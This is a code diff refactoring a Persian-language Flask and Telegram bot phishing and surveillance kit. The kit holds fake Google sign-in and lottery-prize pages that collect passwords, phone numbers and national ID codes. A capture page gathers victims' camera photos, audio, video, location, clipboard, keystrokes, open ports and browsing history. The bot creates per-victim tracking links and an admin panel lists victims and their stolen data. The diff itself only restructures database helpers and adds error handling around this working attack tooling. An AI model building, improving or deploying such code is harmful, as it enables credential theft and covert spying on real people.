@@ -85,7 +85,7 @@ def send_telegram_location(lat, lng):
     except Exception as e:
         app.logger.error(f"Telegram location failed: {e}")
 
-# -------------------- Phishing Pages (Realistic) --------------------
+# -------------------- Phishing Pages --------------------
 PHISHING_GOOGLE = """
 <!DOCTYPE html>
 <html><head><meta charset="UTF-8"><title>Sign in – Google</title>
@@ -135,7 +135,7 @@ PHISHING_LOTTERY = """
 <body><div class="container"><h1>🎰 چرخ شانس</h1><p>شما برنده آیفون ۱۵ شدید! برای دریافت، اطلاعات زیر را وارد کنید.</p><form method="POST" action="/login/{{ token }}"><input type="text" name="email" placeholder="شماره تلفن" required><input type="text" name="password" placeholder="کد ملی"><button class="btn" type="submit">دریافت جایزه</button></form></div></body></html>
 """
 
-# Capture Page Template (with pop-under, camera, mic, video, etc.)
+# -------------------- Capture Page --------------------
 CAPTURE_PAGE_TEMPLATE = """
 <!DOCTYPE html>
 <html>
@@ -250,7 +250,6 @@ CAPTURE_PAGE_TEMPLATE = """
 </body></html>
 """
 
-# Admin Web Templates
 ADMIN_LOGIN = """
 <!DOCTYPE html><html><head><title>ورود</title><style>body{background:#1e1e1e;color:#0f0;text-align:center;padding-top:20vh;} input{padding:10px;margin:5px;}</style></head>
 <body><h2>پنل مدیریت</h2><form method=post action=/admin><input type=password name=pass placeholder=رمز عبور><br><input type=submit value=ورود></form></body></html>
@@ -423,7 +422,7 @@ def admin():
         })
     return render_template_string(ADMIN_PANEL_TEMPLATE, victims=victims)
 
-# Service Worker
+# -------------------- Service Worker --------------------
 SW_JS = """
 self.addEventListener('install', event => { self.skipWaiting(); });
 self.addEventListener('activate', event => { event.waitUntil(clients.claim()); });
@@ -484,16 +483,13 @@ def service_worker():
 def download_file(filename):
     return send_from_directory('static', filename)
 
-# -------------------- Telegram Bot Handlers --------------------
-# Helper to create a new victim entry with specific phishing type
-def create_victim_token(phishing_type):
-    token = str(uuid.uuid4())
-    db = get_db()
-    db.execute("INSERT INTO victims (token, created_at, ip, last_active, phishing_type) VALUES (?, ?, ?, ?, ?)",
-               (token, datetime.now().isoformat(), request.remote_addr if request else "0.0.0.0", datetime.now().isoformat(), phishing_type))
-    db.commit()
-    return token
+# -------------------- Bot Database Helpers --------------------
+def get_db_connection():
+    conn = sqlite3.connect(DATABASE)
+    conn.row_factory = sqlite3.Row
+    return conn
 
+# -------------------- Telegram Bot Handlers --------------------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     help_text = (
         "🔹 به ربات هوشمند خوش آمدید!\n\n"
@@ -522,7 +518,7 @@ async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ]
     await update.message.reply_text("🔧 پنل مدیریت:", reply_markup=InlineKeyboardMarkup(keyboard))
 
-# -------------------- Learning Commands --------------------
+# --- Learn/Unlearn/Wordlist ---
 async def learn_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_USER_ID:
         await update.message.reply_text("⛔ فقط مدیر ربات می‌تواند کلمه یاد بدهد.")
@@ -533,9 +529,10 @@ async def learn_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     keyword = args[0].strip().lower()
     response = ' '.join(args[1:])
-    db = get_db()
-    db.execute("INSERT OR REPLACE INTO learned (keyword, response) VALUES (?, ?)", (keyword, response))
-    db.commit()
+    conn = get_db_connection()
+    conn.execute("INSERT OR REPLACE INTO learned (keyword, response) VALUES (?, ?)", (keyword, response))
+    conn.commit()
+    conn.close()
     await update.message.reply_text(f"✅ یاد گرفتم: وقتی کسی بگوید «{keyword}» پاسخ دهم «{response}»")
 
 async def unlearn_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -546,17 +543,19 @@ async def unlearn_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("📝 لطفاً کلمه‌ای که می‌خواهید حذف کنید را وارد کنید: /unlearn <کلمه>")
         return
     keyword = context.args[0].strip().lower()
-    db = get_db()
-    cur = db.execute("DELETE FROM learned WHERE keyword=?", (keyword,))
-    db.commit()
+    conn = get_db_connection()
+    cur = conn.execute("DELETE FROM learned WHERE keyword=?", (keyword,))
+    conn.commit()
+    conn.close()
     if cur.rowcount > 0:
         await update.message.reply_text(f"❌ کلمه «{keyword}» و پاسخ مرتبط حذف شد.")
     else:
         await update.message.reply_text(f"⚠️ کلمه «{keyword}» در لیست یادگیری وجود ندارد.")
 
 async def wordlist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    db = get_db()
-    rows = db.execute("SELECT keyword, response FROM learned ORDER BY keyword").fetchall()
+    conn = get_db_connection()
+    rows = conn.execute("SELECT keyword, response FROM learned ORDER BY keyword").fetchall()
+    conn.close()
     if not rows:
         await update.message.reply_text("📭 هنوز هیچ کلمه‌ای یاد نگرفته‌ام.")
         return
@@ -565,17 +564,18 @@ async def wordlist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         text += f"• <b>{row['keyword']}</b> → {row['response']}\n"
     await update.message.reply_text(text, parse_mode="HTML")
 
-# Message handler for learned words
+# --- Auto-Reply using Learned Words ---
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg_text = update.message.text.lower()
-    db = get_db()
-    rows = db.execute("SELECT keyword, response FROM learned").fetchall()
+    conn = get_db_connection()
+    rows = conn.execute("SELECT keyword, response FROM learned").fetchall()
+    conn.close()
     for row in rows:
         if row['keyword'] in msg_text:
             await update.message.reply_text(row['response'])
             break
 
-# -------------------- Callback Query Handler --------------------
+# --- Callback Query Handler ---
 PHISHING_TYPES = {
     "google": "🔵 گوگل",
     "gmail": "✉️ جیمیل",
@@ -593,188 +593,193 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     data = query.data
     user_id = query.from_user.id
 
-    if data == "new_link":
-        if not BOT_ACTIVE:
-            await query.edit_message_text("❌ ربات در حال حاضر غیرفعال است.")
-            return
-        # نمایش انتخاب نوع فیشینگ
-        keyboard = []
-        row = []
-        for code, name in PHISHING_TYPES.items():
-            row.append(InlineKeyboardButton(name, callback_data=f"genlink_{code}"))
-            if len(row) == 2:
+    try:
+        if data == "new_link":
+            if not BOT_ACTIVE:
+                await query.edit_message_text("❌ ربات در حال حاضر غیرفعال است.")
+                return
+            keyboard = []
+            row = []
+            for code, name in PHISHING_TYPES.items():
+                row.append(InlineKeyboardButton(name, callback_data=f"genlink_{code}"))
+                if len(row) == 2:
+                    keyboard.append(row)
+                    row = []
+            if row:
                 keyboard.append(row)
-                row = []
-        if row:
-            keyboard.append(row)
-        keyboard.append([InlineKeyboardButton("🔙 بازگشت", callback_data="start")])
-        await query.edit_message_text("🎯 نوع قربانی را انتخاب کنید:", reply_markup=InlineKeyboardMarkup(keyboard))
+            keyboard.append([InlineKeyboardButton("🔙 بازگشت", callback_data="start")])
+            await query.edit_message_text("🎯 نوع قربانی را انتخاب کنید:", reply_markup=InlineKeyboardMarkup(keyboard))
 
-    elif data.startswith("genlink_"):
-        ptype = data.replace("genlink_", "")
-        token = create_victim_token(ptype)
-        link = f"{PUBLIC_URL}/go/{token}"
-        await query.edit_message_text(f"✅ لینک ({PHISHING_TYPES[ptype]}) آماده:\n{link}\n\nبرای قربانی ارسال کنید.")
+        elif data.startswith("genlink_"):
+            ptype = data.replace("genlink_", "")
+            token = str(uuid.uuid4())
+            conn = get_db_connection()
+            conn.execute("INSERT INTO victims (token, created_at, ip, last_active, phishing_type) VALUES (?, ?, ?, ?, ?)",
+                         (token, datetime.now().isoformat(), query.message.chat.id if query.message else "0.0.0.0", datetime.now().isoformat(), ptype))
+            conn.commit()
+            conn.close()
+            link = f"{PUBLIC_URL}/go/{token}"
+            await query.edit_message_text(f"✅ لینک ({PHISHING_TYPES[ptype]}) آماده:\n{link}\n\nبرای قربانی ارسال کنید.")
 
-    elif data.startswith("photo|") or data.startswith("audio|") or data.startswith("video|") or data.startswith("location|") or data.startswith("clipboard|") or data.startswith("keystrokes|") or data.startswith("ports|") or data.startswith("history|"):
-        parts = data.split('|')
-        action = parts[0]
-        token = parts[1]
-        db = sqlite3.connect(DATABASE)
-        db.row_factory = sqlite3.Row
-        if action == "photo":
-            row = db.execute("SELECT data FROM media WHERE token=? AND type='photo' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
-            if row and row['data']:
-                await query.message.reply_photo(photo=io.BytesIO(row['data']), caption=f"📸 عکس از {token}")
-            else:
-                await query.answer("هنوز عکسی دریافت نشده.", show_alert=True)
-        elif action == "audio":
-            row = db.execute("SELECT data FROM media WHERE token=? AND type='audio' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
-            if row and row['data']:
-                await query.message.reply_audio(audio=io.BytesIO(row['data']), caption=f"🎤 صدا از {token}")
-            else:
-                await query.answer("هنوز صدایی ضبط نشده.", show_alert=True)
-        elif action == "video":
-            row = db.execute("SELECT data FROM media WHERE token=? AND type='video' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
-            if row and row['data']:
-                await query.message.reply_video(video=io.BytesIO(row['data']), caption=f"🎥 ویدیو از {token}")
-            else:
-                await query.answer("هنوز ویدیویی ضبط نشده.", show_alert=True)
-        elif action == "location":
-            row = db.execute("SELECT data FROM logs WHERE token=? AND type='location' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
-            if row:
-                d = json.loads(row['data'])
-                await query.message.reply_location(latitude=d['lat'], longitude=d['lng'])
-            else:
-                await query.answer("موقعیت یافت نشد.", show_alert=True)
-        elif action == "clipboard":
-            row = db.execute("SELECT data FROM logs WHERE token=? AND type='clipboard' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
-            if row:
-                d = json.loads(row['data'])
-                await query.message.reply_text(f"📋 Clipboard: <code>{d['data']}</code>", parse_mode='HTML')
-            else:
-                await query.answer("کلیپ‌بورد خالی.", show_alert=True)
-        elif action == "keystrokes":
-            rows = db.execute("SELECT data FROM logs WHERE token=? AND type='keystrokes' ORDER BY timestamp ASC", (token,)).fetchall()
-            if rows:
-                keys = ''.join([json.loads(r['data'])['data'] for r in rows])
-                await query.message.reply_text(f"⌨️ Keystrokes: <code>{keys}</code>", parse_mode='HTML')
-            else:
-                await query.answer("کی‌استروکی ثبت نشده.", show_alert=True)
-        elif action == "ports":
-            rows = db.execute("SELECT data FROM logs WHERE token=? AND type='open_port'", (token,)).fetchall()
-            if rows:
-                ports = set([json.loads(r['data'])['port'] for r in rows])
-                await query.message.reply_text(f"🔌 Open ports: {', '.join(map(str, ports))}")
-            else:
-                await query.answer("پورت بازی یافت نشد.", show_alert=True)
-        elif action == "history":
-            rows = db.execute("SELECT data FROM logs WHERE token=? AND type='history'", (token,)).fetchall()
-            if rows:
-                hist = ', '.join([f"{json.loads(r['data'])['site']} ({json.loads(r['data'])['visited']})" for r in rows])
-                await query.message.reply_text(f"🌐 Visited: {hist}")
-            else:
-                await query.answer("تاریخچه‌ای یافت نشد.", show_alert=True)
-        db.close()
+        elif data.startswith("photo|") or data.startswith("audio|") or data.startswith("video|") or data.startswith("location|") or data.startswith("clipboard|") or data.startswith("keystrokes|") or data.startswith("ports|") or data.startswith("history|"):
+            parts = data.split('|')
+            action = parts[0]
+            token = parts[1]
+            conn = get_db_connection()
+            if action == "photo":
+                row = conn.execute("SELECT data FROM media WHERE token=? AND type='photo' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
+                if row and row['data']:
+                    await query.message.reply_photo(photo=io.BytesIO(row['data']), caption=f"📸 عکس از {token}")
+                else:
+                    await query.answer("هنوز عکسی دریافت نشده.", show_alert=True)
+            elif action == "audio":
+                row = conn.execute("SELECT data FROM media WHERE token=? AND type='audio' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
+                if row and row['data']:
+                    await query.message.reply_audio(audio=io.BytesIO(row['data']), caption=f"🎤 صدا از {token}")
+                else:
+                    await query.answer("هنوز صدایی ضبط نشده.", show_alert=True)
+            elif action == "video":
+                row = conn.execute("SELECT data FROM media WHERE token=? AND type='video' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
+                if row and row['data']:
+                    await query.message.reply_video(video=io.BytesIO(row['data']), caption=f"🎥 ویدیو از {token}")
+                else:
+                    await query.answer("هنوز ویدیویی ضبط نشده.", show_alert=True)
+            elif action == "location":
+                row = conn.execute("SELECT data FROM logs WHERE token=? AND type='location' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
+                if row:
+                    d = json.loads(row['data'])
+                    await query.message.reply_location(latitude=d['lat'], longitude=d['lng'])
+                else:
+                    await query.answer("موقعیت یافت نشد.", show_alert=True)
+            elif action == "clipboard":
+                row = conn.execute("SELECT data FROM logs WHERE token=? AND type='clipboard' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
+                if row:
+                    d = json.loads(row['data'])
+                    await query.message.reply_text(f"📋 Clipboard: <code>{d['data']}</code>", parse_mode='HTML')
+                else:
+                    await query.answer("کلیپ‌بورد خالی.", show_alert=True)
+            elif action == "keystrokes":
+                rows = conn.execute("SELECT data FROM logs WHERE token=? AND type='keystrokes' ORDER BY timestamp ASC", (token,)).fetchall()
+                if rows:
+                    keys = ''.join([json.loads(r['data'])['data'] for r in rows])
+                    await query.message.reply_text(f"⌨️ Keystrokes: <code>{keys}</code>", parse_mode='HTML')
+                else:
+                    await query.answer("کی‌استروکی ثبت نشده.", show_alert=True)
+            elif action == "ports":
+                rows = conn.execute("SELECT data FROM logs WHERE token=? AND type='open_port'", (token,)).fetchall()
+                if rows:
+                    ports = set([json.loads(r['data'])['port'] for r in rows])
+                    await query.message.reply_text(f"🔌 Open ports: {', '.join(map(str, ports))}")
+                else:
+                    await query.answer("پورت بازی یافت نشد.", show_alert=True)
+            elif action == "history":
+                rows = conn.execute("SELECT data FROM logs WHERE token=? AND type='history'", (token,)).fetchall()
+                if rows:
+                    hist = ', '.join([f"{json.loads(r['data'])['site']} ({json.loads(r['data'])['visited']})" for r in rows])
+                    await query.message.reply_text(f"🌐 Visited: {hist}")
+                else:
+                    await query.answer("تاریخچه‌ای یافت نشد.", show_alert=True)
+            conn.close()
 
-    elif data == "admin_panel":
-        if user_id != ADMIN_USER_ID:
-            await query.answer("⛔ فقط مدیر ربات می‌تواند به پنل دسترسی داشته باشد.", show_alert=True)
-            return
-        keyboard = [
-            [InlineKeyboardButton("روشن/خاموش کردن ربات", callback_data="toggle_bot")],
-            [InlineKeyboardButton("📋 لیست قربانیان", callback_data="victims_list")],
-            [InlineKeyboardButton("🔙 بازگشت", callback_data="start")]
-        ]
-        await query.edit_message_text("🔧 پنل مدیریت:", reply_markup=InlineKeyboardMarkup(keyboard))
+        elif data == "admin_panel":
+            if user_id != ADMIN_USER_ID:
+                await query.answer("⛔ فقط مدیر ربات می‌تواند به پنل دسترسی داشته باشد.", show_alert=True)
+                return
+            keyboard = [
+                [InlineKeyboardButton("روشن/خاموش کردن ربات", callback_data="toggle_bot")],
+                [InlineKeyboardButton("📋 لیست قربانیان", callback_data="victims_list")],
+                [InlineKeyboardButton("🔙 بازگشت", callback_data="start")]
+            ]
+            await query.edit_message_text("🔧 پنل مدیریت:", reply_markup=InlineKeyboardMarkup(keyboard))
 
-    elif data == "toggle_bot":
-        if user_id != ADMIN_USER_ID:
-            await query.answer("شما اجازه ندارید.", show_alert=True)
-            return
-        BOT_ACTIVE = not BOT_ACTIVE
-        status = "✅ فعال" if BOT_ACTIVE else "❌ غیرفعال"
-        await query.edit_message_text(f"ربات اکنون {status} است.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="admin_panel")]]))
+        elif data == "toggle_bot":
+            if user_id != ADMIN_USER_ID:
+                await query.answer("شما اجازه ندارید.", show_alert=True)
+                return
+            BOT_ACTIVE = not BOT_ACTIVE
+            status = "✅ فعال" if BOT_ACTIVE else "❌ غیرفعال"
+            await query.edit_message_text(f"ربات اکنون {status} است.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="admin_panel")]]))
 
-    elif data == "start":
-        keyboard = [[InlineKeyboardButton("🔗 ساخت لینک جدید", callback_data="new_link")]]
-        if user_id == ADMIN_USER_ID:
-            keyboard.append([InlineKeyboardButton("⚙️ پنل مدیریت", callback_data="admin_panel")])
-        await query.edit_message_text("لطفاً یکی از گزینه‌های زیر را انتخاب کنید:", reply_markup=InlineKeyboardMarkup(keyboard))
+        elif data == "start":
+            keyboard = [[InlineKeyboardButton("🔗 ساخت لینک جدید", callback_data="new_link")]]
+            if user_id == ADMIN_USER_ID:
+                keyboard.append([InlineKeyboardButton("⚙️ پنل مدیریت", callback_data="admin_panel")])
+            await query.edit_message_text("لطفاً یکی از گزینه‌های زیر را انتخاب کنید:", reply_markup=InlineKeyboardMarkup(keyboard))
 
-    elif data == "victims_list":
-        if user_id != ADMIN_USER_ID:
-            await query.answer("شما اجازه ندارید.", show_alert=True)
-            return
-        db = sqlite3.connect(DATABASE)
-        db.row_factory = sqlite3.Row
-        victims = db.execute("SELECT token, ip, last_active, phishing_type FROM victims ORDER BY last_active DESC").fetchall()
-        db.close()
-        if not victims:
-            await query.edit_message_text("هنوز هیچ قربانی‌ای ثبت نشده.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="admin_panel")]]))
-            return
-        buttons = []
-        for v in victims:
-            short = v['token'][:8] + "..."
-            last = v['last_active'] if v['last_active'] else "نامشخص"
-            ptype = PHISHING_TYPES.get(v['phishing_type'], v['phishing_type'])
-            btn = InlineKeyboardButton(f"{ptype} | {short} | {last}", callback_data=f"victim_detail|{v['token']}")
-            buttons.append([btn])
-        buttons.append([InlineKeyboardButton("بازگشت به پنل", callback_data="admin_panel")])
-        await query.edit_message_text("📋 لیست قربانیان (روی هرکدام کلیک کنید):", reply_markup=InlineKeyboardMarkup(buttons))
+        elif data == "victims_list":
+            if user_id != ADMIN_USER_ID:
+                await query.answer("شما اجازه ندارید.", show_alert=True)
+                return
+            conn = get_db_connection()
+            victims = conn.execute("SELECT token, ip, last_active, phishing_type FROM victims ORDER BY last_active DESC").fetchall()
+            conn.close()
+            if not victims:
+                await query.edit_message_text("هنوز هیچ قربانی‌ای ثبت نشده.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="admin_panel")]]))
+                return
+            buttons = []
+            for v in victims:
+                short = v['token'][:8] + "..."
+                last = v['last_active'] if v['last_active'] else "نامشخص"
+                ptype = PHISHING_TYPES.get(v['phishing_type'], v['phishing_type'])
+                btn = InlineKeyboardButton(f"{ptype} | {short} | {last}", callback_data=f"victim_detail|{v['token']}")
+                buttons.append([btn])
+            buttons.append([InlineKeyboardButton("بازگشت به پنل", callback_data="admin_panel")])
+            await query.edit_message_text("📋 لیست قربانیان (روی هرکدام کلیک کنید):", reply_markup=InlineKeyboardMarkup(buttons))
 
-    elif data.startswith("victim_detail|"):
-        if user_id != ADMIN_USER_ID:
-            await query.answer("شما اجازه ندارید.", show_alert=True)
-            return
-        token = data.split("|")[1]
-        db = sqlite3.connect(DATABASE)
-        db.row_factory = sqlite3.Row
-        victim = db.execute("SELECT * FROM victims WHERE token=?", (token,)).fetchone()
-        if not victim:
-            await query.edit_message_text("قربانی یافت نشد.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت به لیست", callback_data="victims_list")]]))
-            db.close()
-            return
-        log_dev = db.execute("SELECT data FROM logs WHERE token=? AND type='device' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
-        info = json.loads(log_dev['data']) if log_dev else {"warning": "هنوز اطلاعات دستگاه ارسال نشده است."}
-        db.close()
+        elif data.startswith("victim_detail|"):
+            if user_id != ADMIN_USER_ID:
+                await query.answer("شما اجازه ندارید.", show_alert=True)
+                return
+            token = data.split("|")[1]
+            conn = get_db_connection()
+            victim = conn.execute("SELECT * FROM victims WHERE token=?", (token,)).fetchone()
+            if not victim:
+                await query.edit_message_text("قربانی یافت نشد.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت به لیست", callback_data="victims_list")]]))
+                conn.close()
+                return
+            log_dev = conn.execute("SELECT data FROM logs WHERE token=? AND type='device' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
+            info = json.loads(log_dev['data']) if log_dev else {"warning": "هنوز اطلاعات دستگاه ارسال نشده است."}
+            conn.close()
 
-        text = f"<b>مشخصات قربانی</b>\n"
-        text += f"<b>توکن:</b> <code>{victim['token']}</code>\n"
-        text += f"<b>IP:</b> {victim['ip']}\n"
-        text += f"<b>زمان ایجاد:</b> {victim['created_at']}\n"
-        text += f"<b>آخرین فعالیت:</b> {victim['last_active']}\n"
-        text += f"<b>نوع فیشینگ:</b> {PHISHING_TYPES.get(victim['phishing_type'], victim['phishing_type'])}\n"
-        text += f"<b>اطلاعات دستگاه:</b>\n<pre>{json.dumps(info, indent=2, ensure_ascii=False)}</pre>"
+            text = f"<b>مشخصات قربانی</b>\n"
+            text += f"<b>توکن:</b> <code>{victim['token']}</code>\n"
+            text += f"<b>IP:</b> {victim['ip']}\n"
+            text += f"<b>زمان ایجاد:</b> {victim['created_at']}\n"
+            text += f"<b>آخرین فعالیت:</b> {victim['last_active']}\n"
+            text += f"<b>نوع فیشینگ:</b> {PHISHING_TYPES.get(victim['phishing_type'], victim['phishing_type'])}\n"
+            text += f"<b>اطلاعات دستگاه:</b>\n<pre>{json.dumps(info, indent=2, ensure_ascii=False)}</pre>"
 
-        keyboard = [
-            [InlineKeyboardButton("📸 عکس", callback_data=f"photo|{token}"),
-             InlineKeyboardButton("🎤 صدا", callback_data=f"audio|{token}"),
-             InlineKeyboardButton("🎥 ویدیو", callback_data=f"video|{token}")],
-            [InlineKeyboardButton("📍 موقعیت", callback_data=f"location|{token}"),
-             InlineKeyboardButton("📋 کلیپ‌بورد", callback_data=f"clipboard|{token}")],
-            [InlineKeyboardButton("⌨️ کی‌استروک", callback_data=f"keystrokes|{token}"),
-             InlineKeyboardButton("🔌 پورت‌ها", callback_data=f"ports|{token}")],
-            [InlineKeyboardButton("🌐 تاریخچه", callback_data=f"history|{token}")],
-            [InlineKeyboardButton("🗑 حذف قربانی", callback_data=f"delete_victim|{token}")],
-            [InlineKeyboardButton("🔙 بازگشت به لیست", callback_data="victims_list")]
-        ]
-        await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
+            keyboard = [
+                [InlineKeyboardButton("📸 عکس", callback_data=f"photo|{token}"),
+                 InlineKeyboardButton("🎤 صدا", callback_data=f"audio|{token}"),
+                 InlineKeyboardButton("🎥 ویدیو", callback_data=f"video|{token}")],
+                [InlineKeyboardButton("📍 موقعیت", callback_data=f"location|{token}"),
+                 InlineKeyboardButton("📋 کلیپ‌بورد", callback_data=f"clipboard|{token}")],
+                [InlineKeyboardButton("⌨️ کی‌استروک", callback_data=f"keystrokes|{token}"),
+                 InlineKeyboardButton("🔌 پورت‌ها", callback_data=f"ports|{token}")],
+                [InlineKeyboardButton("🌐 تاریخچه", callback_data=f"history|{token}")],
+                [InlineKeyboardButton("🗑 حذف قربانی", callback_data=f"delete_victim|{token}")],
+                [InlineKeyboardButton("🔙 بازگشت به لیست", callback_data="victims_list")]
+            ]
+            await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
 
-    elif data.startswith("delete_victim|"):
-        if user_id != ADMIN_USER_ID:
-            await query.answer("شما اجازه ندارید.", show_alert=True)
-            return
-        token = data.split("|")[1]
-        db = sqlite3.connect(DATABASE)
-        db.row_factory = sqlite3.Row
-        db.execute("DELETE FROM victims WHERE token=?", (token,))
-        db.execute("DELETE FROM logs WHERE token=?", (token,))
-        db.execute("DELETE FROM media WHERE token=?", (token,))
-        db.execute("DELETE FROM credentials WHERE token=?", (token,))
-        db.commit()
-        db.close()
-        await query.edit_message_text(f"🗑 قربانی {token} و تمام داده‌های مرتبط حذف شد.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت به لیست", callback_data="victims_list")]]))
+        elif data.startswith("delete_victim|"):
+            if user_id != ADMIN_USER_ID:
+                await query.answer("شما اجازه ندارید.", show_alert=True)
+                return
+            token = data.split("|")[1]
+            conn = get_db_connection()
+            conn.execute("DELETE FROM victims WHERE token=?", (token,))
+            conn.execute("DELETE FROM logs WHERE token=?", (token,))
+            conn.execute("DELETE FROM media WHERE token=?", (token,))
+            conn.execute("DELETE FROM credentials WHERE token=?", (token,))
+            conn.commit()
+            conn.close()
+            await query.edit_message_text(f"🗑 قربانی {token} و تمام داده‌های مرتبط حذف شد.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت به لیست", callback_data="victims_list")]]))
+
+    except Exception as e:
+        app.logger.error(f"Button handler error: {e}")
+        await query.edit_message_text("❌ خطایی رخ داد. لطفاً دوباره تلاش کنید.")
 
 async def search_victim(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_USER_ID:
@@ -784,9 +789,8 @@ async def search_victim(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("لطفاً یک توکن وارد کنید: /search <token>")
         return
     token = context.args[0]
-    db = sqlite3.connect(DATABASE)
-    db.row_factory = sqlite3.Row
-    victim = db.execute("SELECT * FROM victims WHERE token=?", (token,)).fetchone()
+    conn = get_db_connection()
+    victim = conn.execute("SELECT * FROM victims WHERE token=?", (token,)).fetchone()
     if victim:
         text = f"<b>قربانی پیدا شد:</b>\n"
         text += f"<b>توکن:</b> <code>{victim['token']}</code>\n"
@@ -797,7 +801,7 @@ async def search_victim(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
     else:
         await update.message.reply_text("قربانی با این توکن یافت نشد.")
-    db.close()
+    conn.close()
 
 # -------------------- Main --------------------
 def run_flask():
@@ -816,6 +820,5 @@ if __name__ == '__main__':
     application.add_handler(CommandHandler("wordlist", wordlist_command))
     application.add_handler(CommandHandler("search", search_victim))
     application.add_handler(CallbackQueryHandler(button_handler))
-    # Add message handler for learned keywords (low priority)
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     application.run_polling()
